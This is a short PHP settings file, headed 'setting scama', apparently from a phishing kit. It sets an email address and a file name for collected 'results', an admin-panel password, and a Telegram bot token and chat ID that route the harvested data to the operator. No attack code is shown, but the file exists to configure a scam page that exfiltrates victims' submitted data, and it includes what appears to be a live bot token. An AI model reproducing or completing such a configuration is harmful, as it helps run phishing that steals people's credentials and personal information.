<?php
// setting scama
$yourmail  = "";  // your email 
$namerand = "rzlt";  // name for file rzult *
$pass = "123345"; // pass admin panel
$botToken="5283163686:AAHvKg_7cHeT1acGJrbfEYRkxfixTuCJjC4"; // token bot telegram
$chatId="-722353175";  // chatId telegram

?>